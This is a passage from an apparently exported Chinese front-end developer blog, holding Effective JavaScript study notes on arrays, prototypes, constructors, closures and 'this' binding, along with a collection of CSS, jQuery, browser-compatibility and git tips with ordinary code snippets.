只要满足上述2点,即使是一个对象字面量也可以改造为一个类数组对象1234var arraylike = &#123;0:'a', 1:'b', 2:'c', length:3&#125;;var result = Array.prototype.map.call(arraylike, function(s)&#123; return s.toUpperCase();&#125;); // [\"A\",\"B\",\"C\"] 字符串可当做不可变的数组, 因此Array.prototype中的方法操作字符串时并不会修改原始数组.123var result = Array.prototype.map.call(\"abc\", function(s)&#123; return s.toUpperCase();&#125;); // [\"A\", \"B\", \"C\"] 只有一个Array方法不是完全通用的,数组连接方法concat, 该方法可以由任意的类数组接收者调用. 它会检查参数的[[class]]属性. 若参数是一个真实的数组, 那么concat会将该数组的内容连接起来作为结果; 否则, 参数将以一个单一的元素来连接.1234567891011// 不能简单的连接一个以arguments对象作为内容的数组function namesColumn()&#123; return [\"Names\"].concat(arguments);&#125;namesColumn(\"alice\", \"bob\", \"chris\"); // [\"Names\",&#123;0: \"alice\", 1:\"bob\", 2:\"chris\"&#125;]// 为了使concat将一个类数组对象作为真正的数组, 我们需要自己转换该数组function namesColumn()&#123; return [\"Names\"].concat([].slice.call(arguments));&#125;namesColumn(\"alice\", \"bob\", \"chris\"); // [\"Names\", \"alice\", \"bob\", \"chris\"] 目前, 模拟JS数组的所有行为比较困难, 主要由于数组行为的两个方面. 将length属性值设为小于n的值会自动删除索引值大于或等于n的所有属性 增加一个索引值为n(大于或等于length属性值)的属性会自动的设置length属性为n+1 第二条规则尤其难以完成, 因为它需要监控索引属性的增加以自动地更新length属性. 对于类数组对象, 通过提取方法对象并使用其call方法来复用通用的Array方法 任意一个具有索引属性和恰当length属性的对象都可以使用通用Array方法 52. 数组字面量优于数组构造函数JS的优雅和方便可以归功于常见构造块的简明的字面量语法(对象, 函数, 数组). 也可以使用数组构造函数代替12var a = [1,2,3,4];var a = new Array(1,2,3,4); 使用数组构造函数来代替数组字面量会有一些微小的差别. 比如,无法确定是否修改过全局的Array变量.12Array = String;new Array(1,2,3,4); // new String(1); 同时还有一个特殊的情况,使用单数字参数来调用Array构造函数, 并不是构造只有一个元素的数组, 而是构造了一个没有元素的数组, 但其长度属性为给定的参数. [&quot;hello&quot;] 和 new Array(&quot;hello&quot;)行为相同, 但是 [17] 和 new Array(17)的行为却完全不同. 若数组构造函数的唯一个参数是数组则数组的构造函数行为是不同的 使用数组字面量替代数组构造函数","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"effective-javascript","slug":"effective-javascript","permalink":"https://github.com/xmoyKING/tags/effective-javascript/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"}]},{"title":"小技巧集合","slug":"mixed","date":"2017-03-01T05:58:45.000Z","updated":"2017-12-11T11:58:15.347Z","comments":true,"path":"2017/03/01/mixed/","link":"","permalink":"https://github.com/xmoyKING/2017/03/01/mixed/","excerpt":"","text":"主要记录在学习和编码过程中遇到的一些小问题以及对应的解决方法。 无js实现替换原始checkbox radio, :checked和:hover的使用 语义化的标签结构,h* 和 p 以及 span 的用法 写js一定注意加号 以及 dom 缓存 transition 和 transform 以及 keyframe 的用法 禁止input粘贴复制，右键等1onpaste=\"return false\" oncontextmenu=\"return false\" oncopy=\"return false\" oncut=\"return false\" 注意一些列表中，若内容不是固定字数的，一定要加上css省略css实现一行内省略号,同时若出现换行则失效，所以需要禁止换行nobr标签和white-space : normal/nowrap, 同时，在android手机上（andriod 7）会出现字体上方2px左右被截取的bug，iphone上没有此问题123overflow: hidden;text-overflow: ellipsis; white-space: nowrap; 当行高限制了，overflow:hidden 有bug，上下端会被截取1-2px，解决方法：使用padding代替margin、line-height 1234567// 解析URLfunction getUrlParam(name) &#123; var reg = new RegExp(\"(^|&amp;)\" + name + \"=([^&amp;]*)(&amp;|$)\"); //构造一个含有目标参数的正则表达式对象 var r = window.location.search.substr(1).match(reg); //匹配目标参数 if (r != null) return unescape(r[2]); return null; //返回参数值&#125; jquery 表单序列化为json，12345678910111213141516$.fn.serializeObject = function() &#123; var o = &#123;&#125;; var a = this.serializeArray(); $.each(a, function() &#123; if (o[this.name] !== undefined) &#123; // 值不为undefined，已经存在对应的键值对了，此时为键值对为数组类型 if (!o[this.name].push) &#123; // 若第一次重复（第二次找到该name值）则直接转换为存储数组 o[this.name] = [o[this.name]]; &#125; o[this.name].push(this.value || ''); // 直接插入已建立的数组中 &#125; else &#123; // 值为undefined，则表示还没有存在该键值对，添加此键值对同时将false转换为空 o[this.name] = this.value || ''; &#125; &#125;); return o;&#125;; 新建软连接：Windows下硬链接、软链接和快捷方式的区别 windows 文件文件夹映射junction和mklink，创建软硬链接在目录下：D:\\htdocs\\real-auto-mooc\\server\\clouds\\web&gt; mklink /J admin-dev D:\\htdocs\\admin-client &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt; 的作用：话说神奇的content=”IE=edge,chrome=1”的meta标签内容 &lt;meta name=&quot;renderer&quot; content=&quot;webkit|ie-comp|ie-stand&quot;&gt;的作用：浏览器内核控制标签meta说明 有的时候将一个span设置为inline-block后，同时设置50%宽度会出现换行现象，这种时候需要设置为block和float:left即可解决行内元素换行问题, 原因出在行内元素会自带间隔，其他的解决方法可以参考：去除inline-block元素间间距的N种方法 button（其实是很多许多元素）有四种伪类状态，比如focus，active，hover的存在的，同时在移动浏览器下，会出现tap按钮或超链接出现背景色的问题，这个时候可用-webkit-tap-highlight-color: transparent;将高亮色设置为透明。123456789101112/* 在移动端点击为tap时背景 */a,a:hover,a:active,a:visited,a:link,a:focus&#123; -webkit-tap-highlight-color:rgba(0,0,0,0); -webkit-tap-highlight-color: transparent; outline:none; background: none; text-decoration: none;&#125;button, button:hover, button:active, button:focus &#123; -webkit-tap-highlight-color: transparent;&#125; 被BD2问到的一些问题： JS中直接定义的字符串和new String()出来的字符串有什么区别：怎么解释 JavaScript 中的一切皆是对象，拿字符串来说，new 出的和普通方法创建的字符串有哪些方面的区别？js中，字符串字面量和通过构造函数得到字符串有什么本质区别嘛？ JS中数组的map方法JavaScript中的数组遍历forEach()与map()方法以及兼容写法 CSS中，border-radius的顺序，以及值的几种方法 Angularjs应用优化技巧 前端项目代码组织，及项目复杂度问题 js中的稀松数组的问题:遍历时会跳过空白的，而不是undefined，即占位javascript中的稀疏数组(sparse array)和密集数组 match方法 placeholder颜色设置方式, 一下样式中，webkit需要单独写，否则无效123456789101112::-webkit-input-placeholder &#123; /* WebKit browsers */ color: #999; &#125; :-moz-placeholder &#123; /* Mozilla Firefox 4 to 18 */ color: #999; &#125; ::-moz-placeholder &#123; /* Mozilla Firefox 19+ */ color: #999; &#125; :-ms-input-placeholder &#123; /* Internet Explorer 10+ */ color: #999; &#125; 锯齿边框1234567891011.coupon li .fr::before&#123; content: ' '; background: radial-gradient(transparent 0, transparent 4px, #41caed 4px); background-size: 11px 10px; background-position: -1px 10px; width: 4px; height: 100%; position: absolute; left: 0; bottom: 0;&#125; 对url的操作一定需要自己封装， 同时对form表单的操作，同时也需要自己封装一套前端校验的类 word-break: break-all; 针对长的英文单词，设置单词内换行，可以避免多余单词溢出 white-space: nowrap; 强制不换行，避免内部块级元素最大宽度适应父元素 对iphone5宽度适配123@media screen and (max-width: 320px) &#123; /* */&#125; 输入框仅允许输入数字(使用正则替换所有非数字)1style=\"ime-mode:Disabled\" onkeyup=\"value=value.replace(/[^\\d]/g,'')\" onbeforepaste=\"clipboardData.setData('text',clipboardData.getData('text').replace(/[^\\d]/g,''))\" user-select:none; css设置此属性可以在用户双击文字时不选中 CSS媒体查询总结，(CSS3 Media Queries在iPhone4和iPad上的运用)[http://www.w3cplus.com/css3/css3-media-queries-for-iPhone-and-iPads]*目前iphone4已经淘汰，最低为iphone5，但是分辨率没有什么变化，依然可以使用* 使用transform将固定大小移动端页面改为自适应页面 实现移动端图片懒加载（当图片滚动到视窗的时候才加载）, 参考移动端图片延迟加载同时也支持zepto 加载图片的时候不直接将图片地址写入src属性中（src中可以预先设置为一个很小的默认图片地址），而是写入一个自定义属性中比如data-src,然后 监听滚动，当滚动到停止一定的时间（delay）后再执行查看是否有未加载图片出现在视窗内，此时再加载图片，即替换这些视窗内的图片的src值为data-src值。 若想要使用伪元素before或after作为占位元素（插入到正常流中），则需要使用浮动，同时百分比宽高是以寄主元素（即伪元素前的元素）为参照。 关于git文件三种状态及其之间的转换规则：Git中三种文件状态及其转换在vscode新安装后使用内置git提交的时候会有类似Changes not staged for commit的提示，点击always即可（表示一键add并且commit，但是需要手动push） hexo博客遇到如下报错，可以试着重新安装.npm install hexo-renderer-sassERROR Plugin load failed: hexo-renderer-sass Error: Cannot find module &#39;node-sass&#39;注意：最开始试过重新安装node-sass, 但报没有python运行环境，猜测应该不是这个的问题，因为node安装包的时候就不需要python才对。 关于表单自动提交，可以监听document的keyup事件，若e.keyCode === 13则表示回车 js 怎样判断用户是否在浏览当前页面12345678910111213var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : null;var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');var onVisibilityChange = function()&#123; if (!document[hiddenProperty]) &#123; console.log('页面非激活'); &#125;else&#123; console.log('页面激活') &#125;&#125;document.addEventListener(visibilityChangeEvent, onVisibilityChange); git pull时遇到error: cannot lock ref 判断元素的隐藏和显示，主要通过获取元素节点的hidden和visible两个属性来进行判断，比如jquery怎样判断jQuery 元素是否显示与隐藏 针对FireFox,Chrome,Opera的CSS Hack 当jquery无法设置某些表单元素的状态时，则可以使用原生js对表单元素设置状态，比如checkbox，select js中的函数重复声明则会覆盖，但不存在重载，所以重复定义不会有问题，但是重复的对同一元素添加事件监听会导致多个事件依次响应。 关于使文本尾部始终紧跟一个图标的方法，无论是字体超出隐藏还是正常状态（灵活使用background设置在文本框邮编）：1234display: inline-block;max-width: 110px;padding-right: 14px;background: url(../../../images/icon-db-arrow.png) no-repeat center right; 在url中传中文，需要使用escape()对中文进行转码,然后对应的unescape()解码 多行文本溢出显示省略号(…)全攻略123display: -webkit-box;-webkit-box-orient: vertical;-webkit-line-clamp: 3; IOS：Safari不兼容Javascript中的Date问题 有的时候想要使用表单的一些属性，但是又不想使用默认的验证方式，比如&lt;input type=&quot;email&quot; name=&quot;user_email&quot; /&gt;会自动使用浏览器的邮箱验证，但是样式可能与站点不符，一般的做法中，这时只能使用type=&quot;text&quot;了，但是其实此时可以在form表单上指定novalidate 属性。这样告诉浏览器不对输入进行验证的表单。 关于优化的问题，不应该过早优化，在遇到实际问题需要解决前，不应该过早优化，优化应该是解决问题。不要忙于优化而降低了开发效率，因为开发的时间很重要，应该将时间花在解决实际问题上。 关于withCridential=true的问题：使用withCredentials发送跨域请求凭据 , 以及 跨域资源共享 CORS 详解 H5移动端使用定位改变top和left模拟元素移动，在一些配置低的手机上非常卡顿。 关于浏览器的可是区域/窗口宽高，以及文档宽高:js/jquery获取浏览器窗口可视区域高度和宽度以及滚动条高度实现代码：123456$(window).height() // 窗口可视区域高度， jq写法 document.documentElement.clientHeight // 原生写法$(document).height() // 整个文档的高度（真正的高） document.body.offsetHeight // 原生写法$(document).scrollTop() // 滚动条距文档顶部的高度（能获得已经滚动多少距离） document.body.scrollTop // 原生写法 图片容错1234function imgerror(img, src)&#123; img.src = src || \"img src\"; img.onerror = null;&#125; 使用window.open()打开的新窗口会有一个opener对象，是对父窗口的引用。 关于iOS8下H5页面的排版混乱问题，以及IE9兼容问题： 关于IE与placeholder的支持问题：完美解决IE不支持placeholder的问题 在IE下的各种奇特表现：一个input输入框，若只设置line-height而不设置height，则line-height无法将input撑高，为原始默认值，而只有设置了height才能将input撑高。123456789.number [type=text]&#123; width: 50px; height: 27px; /* 此height是关键 */ line-height: 25px; border: 1px solid #bfbfbf; text-align: center; box-sizing: border-box; padding: 0;&#125; 同时，内部绝对定位元素是以a元素为准，而不是a的带相对定位的li父元素，所以需要显示设置其宽高，123456.iconwrap.cart:hover&gt;.drop a &#123; height: 40px; width: 100%; position: relative; display: block;&#125; 元素设置为绝对定位后,必须显示重置line-height为normal,否则top和bottom会起反作用, 在IE中line-height与其他标准浏览器有兼容性问题，12345678910111213141516171819.iconwrap.cart:hover&gt;.drop .pricewrap,.iconwrap.cart:hover&gt;.drop .title&#123; left: 80px; font-size: 12px; line-height: normal;&#125;.iconwrap.cart:hover&gt;.drop .title&#123; top: 0; color: #333;&#125;.iconwrap.cart:hover&gt;.drop .pricewrap&#123; bottom: 0;&#125;.iconwrap.cart:hover&gt;.drop .icon-trash&#123; bottom: 0; right: 0; line-height: normal; color: #c8c8c8;&#125; 关于弹出窗口的兼容，若不带open方法的第三个参数，即不设置弹出窗口的一些基本属性，则使用新tab打开，而不是弹出窗口，而设置一些窗口基本属性后则是弹出式的，同时，很多弹出窗口的属性也有所改变，比如无法取消地址栏，默认没有收藏栏，没有工具栏。 ff和chrome下对弹出窗口设置的实现不太一样,代码：window.open(&#39;&#39;,&quot;_blank&quot;,&#39;width=800&#39;);在ff下，宽度设置，高度自适应，但是在chrome下，没有设置高度则宽度也不会被设置，而是自动适应父窗口。 IE下，使用window.open()打开新窗口bug：打开百度这样的正常域名就可以，但是打开自己本地的网站（127.0.0.1或localhost）就是空白页,目前不知道是什么原因，解决方法，使用a标签跳转，同时在js中location.href是可以使用的 在IE9中对span设置inline-block同时与input组合使用并设置高度时，可能会出现高度不一致的情况（有的时候会一致，有的时候不会，这种情况无法准确定位原因）1&lt;label class=\"number\"&gt;&lt;span class=\"minus\"&gt;-&lt;/span&gt;&lt;input type=\"text\" value=\"5\"&gt;&lt;span class=\"add\"&gt;+&lt;/span&gt;&lt;/label&gt; 1234567891011121314151617181920212223.number span &#123; display: inline-block; box-sizing: border-box; line-height: 25px; height: 27px; width: 15px; cursor: pointer; text-align: center; border: 1px solid #bfbfbf; -webkit-user-select: none; -ms-user-select: none; -moz-user-select: none; user-select: none;&#125;.number [type=text] &#123; width: 50px; height: 27px; line-height: 25px; border: 1px solid #bfbfbf; text-align: center; box-sizing: border-box; padding: 0;&#125; 在IE中，css去除ie自带的input删除功能1input::-ms-clear&#123;display:none;&#125; chrmo下ng报错：An invalid form control with name=’’ is not focusable？出现该错误的原因是chrome发现了有隐藏（display:none）的required需求元素，所以会出错。将ng-show改为ng-if，从隐藏标签变为移除dom，可以避免这个错误。 angular中使用$http.post后台无法接收到数据 后端接收不到AngularJs中$http.post发送的数据的问题 hexo下的bug，在markdown中双写大括号,如下：1&#123;&#123;&#125;&#125; 必须使用整段代码的语法，而不是用行内代码的转义，否则会出现render错误，提示1unexpected token: &#125;&#125; 在绑定label时，若lable中有checkbox这样自身带有点击效果的元素，则绑定的点击事件会被触发两次，解决的方法就是，将label中的checkbox移到外面，然后用for指定id。 使用css动画时，animation-fill-mode:forwards可让动画停留在最后一帧，不加的话 在1s钟之后 动画会回到初始帧 jq有一个grep方法，能够过滤数组, 第一个参数为数组，第二个是判断函数，函数执行时会传入两个参数，第一个参数为元素，第二个参数为元素索引123jQuery.grep(arr, function(e, i ) &#123; return ( e !== 5 &amp;&amp; i &gt; 4 );&#125;); 在windows下，使用textarea获取内容时，需要注意换行为两个符号\\r\\n，分割字符串时一定要对这两个特殊的转义字符做判断。1str.split(/[\\n\\r、]/) H5本地预览图片,采用base64方式12345678910// 判断浏览器是否支持FileReader接口 if (typeof FileReader == 'undefined') &#123; alert('浏览器太老了，不支持预览图片，请更换现代浏览器'); // return false;&#125;var reader = new FileReader(); //将文件以Data URL形式读入页面 reader.readAsDataURL(file);reader.onload = function (e) &#123; var picUrl = this.result;&#125; 离开页面时弹出提示框，询问是否确定离开1234567$(window).on('beforeunload', function(e)&#123; e = e || window.event; //此方法为了在firefox中的兼容 if (e) &#123; e.returnValue = '确定要离开此页吗?'; // For IE and Firefox prior to version 4 &#125; return '...'; // 貌似弹出对话框的内容和title于代码中返回的字符串无关，测自chrome&#125;); 当点击弹出文件选择框慢是由于文本输入框中的accept设置为通配符，此时解决的方法为具体设置为某确定的类型， input[file]标签的accept=”image/*”属性响应很慢的解决办法1&lt;input type=\"file\" accept=\"images/*\"&gt; 同时，如下的file包裹在button中时，点击button，chrome下正常弹出文本框，而在firefox下，无法触发文本选择框。 将button改为span，同时span上不能绑定点击事件，否则也无法弹出文本选择框。123456789&lt;button type=\"button\" class=\"pr\"&gt; 文件上传按钮 &lt;input type=\"file\" class=\"pa\" accept=\".csv, application/vnd.openxmlformats-officedocument.spreadsheetml.sheet, application/vnd.ms-excel\"&gt;&lt;/button&gt;&lt;span class=\"pr button\"&gt; 文件上传按钮 &lt;input type=\"file\" class=\"pa firfox\" accept=\".csv, application/vnd.openxmlformats-officedocument.spreadsheetml.sheet, application/vnd.ms-excel\"&gt;&lt;/span&gt; IE11 下无法识别CSS的initial属性值，但是可以识别auto属性值，所以，若需要重置css的某个属性，尽量使用auto![initial] 在placeholder中若需要换行，则可使用HTML实体字符&amp;#10，表示换行符 pre 自动换行123456pre&#123; white-space: -moz-pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; white-space: pre-wrap;&#125; 允许forever时，若以及存在log文件，则需要加上-a才可以重新start一个新的脚本,比如启动一个express项目：1forever start -a ./bin/www 对git项目加tag时，一定要将tag先push，否则chechkout到其他分支或标签后会丢失更新，同时默认的git push不会上传所有的tag和branch，需要手动指定：1git push origin v0.1.0 当将页面覆盖遮罩时，常常需要禁止滚轮滚动，即将页面overflow设置为hidden，由于滚轮消失会导致页面扩大，有一个明显的向右移动的切换。若想要平稳的切换遮罩层则需要特别注意。12345678910111213141516// 禁止滚动时，增加body右边距，防止页面因为没有滚动条发生偏移(function () &#123; var w1 = $(window).width(); var $body = $(\"html\"); $body.addClass('oh'); var w2 = $(window).width(); $body.removeClass('oh'); console.log(w2, w1, w2-w1); $(\"&lt;style type='text/css'&gt;.stop-scrolling&#123;margin-right:\" + (w2 - w1) + \"px;&#125;&lt;/style&gt;\").appendTo(\"head\");&#125;)();// 显示遮罩时使用语句$(\"html\").css(\"overflow\", \"hidden\").addClass(\"stop-scrolling\");// 隐藏时则$(\"html\").css(\"overflow\", \"auto\").removeClass(\"stop-scrolling\"); 有的时候需要动态插入iframe，然后获取iframe中的元素,并对其进行操作，通过jquery则可以这样做，onload用于检测页面加载是否完成(对于script元素也可以这样做，同样的原理)：123456var frame = $('&lt;iframe frameborder=\"0\" src=\"...\" id=\"previewIframe\"&gt;&lt;/iframe&gt;');$('body').append(frame);frame[0].onload = function () &#123; $(frame[0].contentDocument).find('body,pre').css('margin','0'); // 将默认样式覆盖 ... &#125; 通过Object.defineProperty实现双向绑定：1234567891011var obj = &#123;pwd: 1213&#125;;Object.defineProperty(obj, 'name', &#123; get: function()&#123; console.log('get revoke'); &#125;, set: function(val)&#123; console.log('set revoke'); document.querySelector('#view').innerText = val; &#125;&#125;); 如此，当对obj.name赋新值时，会自动调用set方法，然后对view元素进行操作，将其内容更新为新值。","categories":[],"tags":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/tags/mixed/"}]},{"title":"effective-javascript笔记-4","slug":"effective-javascript4","date":"2017-03-01T03:30:28.000Z","updated":"2017-03-24T16:00:00.000Z","comments":true,"path":"2017/03/01/effective-javascript4/","link":"","permalink":"https://github.com/xmoyKING/2017/03/01/effective-javascript4/","excerpt":"","text":"对象和原型30. 理解 prototype, getPrototypeOf 和 __proto__ 之间的不同原型包含三个独立但相关的访问器. 这三个访问器的命名对prototype属性做了一些变化. C.prototype用于建立由new C()创建的对象的原型 Object.getPrototypeOf(obj)是ES5中用来获取obj对象的原型对象的标准方法 obj.__proto__是获取obj对象的原型对象的非标准方法. 1234567891011121314function User(name, pwHash)&#123; this.name = name; this.pwHash = pwHash;&#125;User.prototype.toString = function()&#123; return '[User ' + this.name + ']';&#125;User.prototype.checkPw = function(pw)&#123; return hash(pw) === this.pwHash;&#125;var u = new User('ssss', '0ef678sdsg567afh8dadsadasd'); User函数带有一个默认的prototype属性,其包含一个开始几乎为空的对象. 在上例中,添加了两个方法到User.prototype对象. toString和checkPw方法. 当使用new操作符创建User的实例时, 产生的对象u会自动获得分配的原型对象, 这个对象存储在User.prototype中. 构造函数的prototype属性用来设置新实例的原型关系. ES5中的函数Object.getPrototypeOf()可以用于检索现有对象的原型. 如:1Object.gePrototypeOf(u) === User.prototype; // true 非标准的检索对象原型的方法, __proto__属性.1u.__proto__ === User.prototype; // true JS中的类 本质上是一个构造函数(User)与一个用于在该类(User.prototype)实例间共享方法的原型对象的结合. C.prototype属性是new C()创建的对象的原型 Object.getPrototypeOf(obj)是ES5中检索对象原型的标准函数 obj.__proto__是检索对象原型的非标准方法 类是由一个构造函数和一个关联的原型组成的一种设计模式 31. 使用Object.getPrototypeOf函数而不是使用__proto__属性无论何时,getPrototypeOf函数都是有效的,而且它是提取对象原型更加标准,可移植的方法. 由于__proto__属性会污染所有的对象,因此会有一些它引发的错误. 32. 始终不要修改__proto__属性__proto__属性提供了修改对象原型链的能力,而Object.getPrototypeOf()方法却不能修改. 所以尽量不要修改此属性,会破坏程序的可移植问题. 另一个问题是性能, 所有的现代JS引擎都深度优化了获取和设置对象属性的行为, 因为这些都是一些最常见的JS程序的操作. 这些优化都是基于引擎在对象结构的认识上, 当修改对象的内部结构(如添加或删除该对象或其原型链中的对象的属性), 将会使一些优化失效. 修改__proto__属性实际上改变了继承结构本身. 比起普通属性,修改__proto__会导致更多的优化失效. 避免修改__proto__属性最大的原因是为了保障程序行为的可预测性, 对象的原型链通过一套确定的属性及属性值来定义它的行为. 修改对象的原型链会交换对象的整个继承层次结构, 某些情况下这些操作可能会有用,但保持继承层次结构稳定是基本准则. 33. 使构造函数与new操作符无关当使用30条中的User函数创建一个构造函数时, 程序需要依赖new操作符来调用该构造函数, 若忘记使用new关键字,则函数的接收者将会是全局对象.1234var u = User('bbbb', '790af7657ds6ad45adsa');u; // undefinedthis.name; // 'bbbb'this.pwHash; // '790af7657ds6ad45adsa' 该函数不仅会返回无意义的undefined,而且会创建/修改全局变量name和pwHash. 若在严格模式下,那么它的接收者默认为undefined. 这种情况下,错误的调用会导致错误, User的第一行试图给this.name赋值时, 会抛出TypeError错误.123456function User(name, pwHash)&#123; ;'use strict'; this.name = name; this.pwHash = pwHash;&#125;var u = User('bbbb', '790af7657ds6ad45adsa'); // error: this is undefined 可以用一个简单的方法检测函数的接收者是否为正确的User实例,即检测是否使用new操作符1234567function User(name, pwHash)&#123; if(!(this instanceof User))&#123; return new User(name, pwHash); &#125; this.name = name; this.pwHash = pwHash;&#125; 使用这种方式,不管是以普通函数还是以构造函数的方式调用User函数,它都返回一个继承自User.prototype的对象.1234var x = User('bbbb', '790af7657ds6ad45adsa');var y = new User('bbbb', '790af7657ds6ad45adsa');x instanceof User; // truey instanceof User; // true 但这种方式的缺点是需要额外的函数调用, 而且很难适用与可变参数函数, 因为没有一种直接模拟apply方法将可变参数函数作为构造函数调用的方式. 还有一个使用Object.create()函数的方法解决new操作符的问题.1234567function User(name, pwHash)&#123; var self = this instanceof User ? this : Object.create(User.prototype); self.name = name; self.pwHash = pwHash; return self;&#125; Object.create()需要一个原型对象作为模版, 并返回一个继承自该原型对象的新对象. 因此,当以函数的方式调用该User函数时, 结果将返回一个继承自User.prototype的新对象,并且该对象具有已经初始化的name和pwHash属性. Object.create()是ES5引进的, 在一些老的或不支持此特性的浏览器中,可通过创建一个局部的构造函数并使用new操作符初始化该构造函数来替代Object.create().1234567if(typeof Object.create === 'undefined')&#123; Object.create = function(prototype)&#123; function C()&#123;&#125; C.prototype = prototype; return new C(); &#125;&#125; 上述版本仅是单参数版本的, 完整版本的Object.create()函数还接受一个可选参数, 用于描述一组定义在新对象上的属性描述符. 若使用new操作符调用该新版本的User函数会发生什么? 由于构造函数覆盖模式, 使用new操作符调用的行为就如函数调用它的行为一样. 构造函数覆盖模式即JS允许new表达式的结果可以被构造函数中的显示return语句所覆盖. 当User函数返回self对象时, new 表达式的结果就变成self对象, 该对象可能是另一个绑定到this的对象. 防范误用构造函数可能没有那么重要,尤其是在局部作用域内使用构造函数的时候. 但最有用的在于理解若以错误的方式调用构造函数会照成的严重后果, 且在文档化构造函数期望使用new操作符调用是很重要, 尤其是在跨大型代码库中共享构造函数或该构造函数来自一个共享库时. 通过使用new操作符或Object.create方法在构造函数定义中调用自身使得该构造函数与调用语法无关. 当一个函数期望使用new操作符调用时,清晰地文档化该函数 34. 在原型中存储方法JS完全有可能不借助原型链编程, 比如30条中的User类, 不在原型中定义方法.1234567891011function User(name, pwHash)&#123; this.name = name; this.pwHash = pwHash; this.toString = function()&#123; return '[User ' + this.name + ']'; &#125;; this.checkPw = function(pw)&#123; return hash(pw) === this.pwHash; &#125;;&#125; 大多数情况下都能正常运行,但若构造多个User类的实例时, 问题就暴露了.1234var u1 = new User(/**/);var u2 = new User(/**/);var u3 = new User(/**/);… 上图为三个对象及他们的原型对象结构图, 每个实例都包含toString和checkPw方法的副本, 而不是通过原型共享这些的方法,所以会有6个”相同的”函数对象. 相反,若用原型链的方式, toString和checkPw方法只被创建一次,对象实例间通过原型共享. 将方法存储在原型中,使其可以被所有的实例使用, 而不需要存储方法实现的多个副本, 也不需要给每个实例对象增加额外的属性. 在查找方法的速度上, 现代JS引擎深度优化了原型查找, 所以将方法复制到实例对象并不一定保证查找速度明显提升, 且实例方法比起原型方法会占用更多内存. 35. 使用闭包存储私有数据JS的对象系统并没有鼓励信息隐藏, 所有的属性名都是一个字符串, 任意一段程序都可以简单地通过访问属性名来获取相应的对象属性. 例如 for…in循环,ES5中的Object.keys()和Object.hasOwnPropertyNames()函数都能轻易获取对象的所有属性名. 通常使用编码规范来”创建”私有属性, 如在命名的时候加上下划线_,这是一种命名规范, 表明对对象的正确行为操作的一种建议. JS提供了一种信息隐藏的机制——闭包. 闭包将数据存储到封闭的变量中而不提供对这些变量的直接访问, 获取闭包内部结构的唯一方式是该函数显示地提供获取它的方法, 也就是说, 与普通对象相反, 对象的属性会被自动的暴露出去,而闭包则自动隐藏起来. 利用这种特性在对象中存储真正的私有数据, 不是将数据作为对象的属性存储,而是在构造函数中以变量的方式来存储, 并将对象的方法转变为引用这些变量的闭包.12345678function User(name, pwHash)&#123; this.toString = function()&#123; return '[User ' + name + ']'; &#125;; this.checkPw = function(pw)&#123; return hash(pw) === pwHash; &#125;;&#125; 注意: 此处的toString和checkPw方法是以变量的方式来引用name和pwHash变量的, 而不是以this属性的方式来引用. 现在, User的实例不包含任何实例属性, 因此外部的代码不能直接访问User实例的name和pwHash变量. 该方式的缺点是, 为了让构造函数中的变量存在于使用它们的方法作用域内, 这些方法必须置于实例对象中. 这会导致副本的扩散. 闭包变量是私有的, 只能通过局部的引用获取 将局部变量作为私有数据从而通过方法实现信息隐藏 36. 只将实例状态存储在实例对象中理解原型对象与其实例之间的一对多的关系对于实现正确的对象行为是非常重要的. 错误的做法是将每一实例的数据存储到原型中. 如: 一个树型数据结构, 将存储子节点的数组放置在原型对象中将会导致实现被完全破坏123456789101112131415161718192021222324function Tree(x)&#123; this.value = x;&#125;Tree.prototype = &#123; children: [], // 此属性应该作为实例状态 addChild: function(x)&#123; this.children.push(x); &#125;&#125;;// 当使用此类构造一课树var left = new Tree(2);left.addChild(1);left.addChild(3);var right = new Tree(6);right.addChild(5);right.addChild(7);var top = new Tree(4);top.addChild(left);top.addChild(right);top.children; // [1, 3, 5, 7, left, right]; 每次调用addChild方法, 都会将值添加到Tree.prototype.children数组中. Tree.prototype.children数组包含了任何地方按序调用addChild方法时传入的所有节点. 实现Tree类的正确方法是为每个实例对象创建一个单独的children数组.123456789function Tree(x)&#123; this.value = x; this.children = []; // 实例状态&#125;Tree.prototype = &#123; addChild: function(x)&#123; this.children.push(x); &#125;&#125;; 通常在一个类的多个实例之间共享方法是安全的, 因为方法通常是无状态的, 这不同于通过this来引用实例状态,(因为方法调用的语法确保了this被绑定到实例对象, 即使该方法是从原型中继承来的,共享方法仍然可以访问实例状态) 一般情况下,任何不可变的数据可以被存储在原型中从而被安全的共享, 有状态的数据原则上也可以存储在原型中, 但原型对象中一般是存储方法, 而每个实例状态存储在实例对象中. 共享可变数据可能会出问题, 因为原型是被其所有的实例共享的 将可变的实例状态存储在实例对象中 37. 认识到this变量的隐式绑定问题编写一个读取CSV(逗号分割型取值)数据的类, 构造函数需要一个可选的分隔器字符数组并构造出一个自定义的正则表达式将每一行分为不同的条目.1234567891011121314151617function CSVReader(separators)&#123; this.separators = separators || [\",\"]; this.regexp = new RegExp(this.separators.map(function(sep)&#123; return \"\\\\\" + sep[0]; &#125;).join(\"|\"));&#125;// CSV 类 read 方法, 将输入字符串划分为一个二维数组CSVReader.prototype.read = function(str)&#123; var lines = str.trim().split(/\\n/); return lines.map(function(line)&#123; return line.split(this.regexp); // 错误的 this 引用 &#125;);&#125;var reader = new CSVReader();reader.read(\"a,b,c\\nd,e,f\\n\"); // [[\"a,b,c\"],[\"d,e,f\"]] 上段代码由于this的错误, 引用了lines.regexp (this.regexp) 而lines没有regexp属性, 所以结果返回line.split(underfined), 解决的方法有三种:1.map方法接受的第二个参数,表示内部的this对象的绑定对象123456789CSVReader.prototype.read = function(str)&#123; var lines = str.trim().split(/\\n/); return lines.map(function(line)&#123; return line.split(this.regexp); // 此时的this表示外部传入的实例对象 &#125;, this); // 将调用read方法的实例对象传入&#125;var reader = new CSVReader();reader.read(\"a,b,c\\nd,e,f\\n\"); // [[\"a\",\"b\",\"c\"],[\"d\",\"e\",\"f\"]] 2.可以在外部函数保存this的引用12345678910CSVReader.prototype.read = function(str)&#123; var lines = str.trim().split(/\\n/); var self = this; // self表示外部的实例对象 return 